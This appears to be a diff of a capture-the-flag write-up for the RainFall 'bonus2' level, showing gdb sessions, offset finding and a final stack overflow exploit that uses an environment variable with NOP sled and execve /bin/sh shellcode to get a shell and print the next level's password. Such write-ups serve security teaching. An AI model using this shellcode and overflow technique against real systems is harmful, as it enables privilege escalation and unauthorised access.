@@ -214,8 +214,6 @@ End of assembler dump.
 0x804872a:	 "Goedemiddag! "
 (gdb) x/s 0x8048717
 0x8048717:	 "Hyv\303\244\303\244 p\303\244iv\303\244\303\244 "
-(gdb) x/s 0x8048717
-0x8048717:	 "Hyv\303\244\303\244 p\303\244iv\303\244\303\244 "
 ```
 
 
@@ -232,47 +230,47 @@ Goedemiddag! test1
 ```
 
 
+```
+(gdb) run $(python -c 'print "\x90" * 40 + " " + "\x90" * 32')
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
 
+Starting program: /home/user/bonus2/bonus2 $(python -c 'print "\x90" * 40 + " " + "\x90" * 32')
+Hyvää päivää
 
+Program received signal SIGSEGV, Segmentation fault.
+0x90909090 in ?? ()
 
+(gdb) info register
+(...)
+ebp            0x90909090       0x90909090 //
+esi            0xbffff6dc       -1073744164
+edi            0xbffff68c       -1073744244
+eip            0x90909090       0x90909090 // On a over sur l'eip
+(...)
 
-
-we test to fill 0x28(40) + 0x20(32) = 72 to understand what happend in the memory we set breakpoint in <+152> greetuser we run the program with 'B' * 40 'A'*32
-
-(gdb) x/100wx $esp
-0xbffff5a0:	0xbffff5b0	0xbffff600	0x00000001	0x00000000
-0xbffff5b0:	0x6c6c6548	0x4242206f	0x42424242	0x42424242
-0xbffff5c0:	0x42424242	0x42424242	0x42424242	0x42424242
-0xbffff5d0:	0x42424242	0x42424242	0x42424242	0x41414242
-0xbffff5e0:	0x41414141	0x41414141	0x41414141	0x41414141
-0xbffff5f0:	0x41414141	0x41414141	0x41414141	0x08004141
-(gdb) x/x $ebp+0x4
-0xbffff5fc:	0x08004141  we change the return address
-so lets change the language and do the same test
-
-0xbffff5a0:	0xbffff5b0	0xbffff600	0x00000001	0x00000000
-0xbffff5b0:	0xc3767948	0x20a4c3a4	0x69a4c370	0xc3a4c376
-0xbffff5c0:	0x424220a4	0x42424242	0x42424242	0x42424242
-0xbffff5d0:	0x42424242	0x42424242	0x42424242	0x42424242
-0xbffff5e0:	0x42424242	0x42424242	0x41414242	0x41414141
-0xbffff5f0:	0x41414141	0x41414141 |0x41414141|	0x41414141
-
-the value selected is the return address
-so in this case we just need to calculate the offset and add shellcode in the begining and change the return address
-
-i used this website to calculate the offset
-https://projects.jason-rush.com/tools/buffer-overflow-eip-offset-string-generator/
-
-Hyvää päivää BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab
+(gdb) run $(python -c 'print "\x90" * 40') Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2A
+Starting program: /home/user/bonus2/bonus2 $(python -c 'print "\x90" * 40') Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2A
+Hyvää päivää Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab
 
 Program received signal SIGSEGV, Segmentation fault.
 0x41366141 in ?? ()
-(gdb)
-bonus2@RainFall:~$ python -c "print 'B' * 18 + '\xc8\xf5\xff\xbf' + 'B' *30" > b
-bonus2@RainFall:~$ python -c "print '\x90' * 6 + '\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80' + 'A' * 30" > a
-bonus2@RainFall:~$ ./bonus2 `cat a` `cat b`
-Hyvää päivää ������j
-                    X�Rh//shh/bin��1�̀AAAAAAAAAAAAABBBBBBBBBBBBBBBBBB����BBBBBBBBBB
+```
+
+On a pu trouver l'offset de notre `eip` a [18](https://wiremask.eu/tools/buffer-overflow-pattern-generator/)
+
+```
+:~$ export LANG=fi
+
+:~$ export PAYLOAD=$(python -c 'print "\x90" * 40 + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"')
+
+:~$ /tmp/getenv PAYLOAD
+0xbfffff46
+
+:~$ ./bonus2 $(python -c 'print "\x90" * 40 + " " + "\x90" * 18 + "PAYLOAD ADDRESS"')
+Hyvää päivää F
 $ whoami
 bonus3
-$
+$ cat /home/user/bonus3/.pass
+71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587
+```
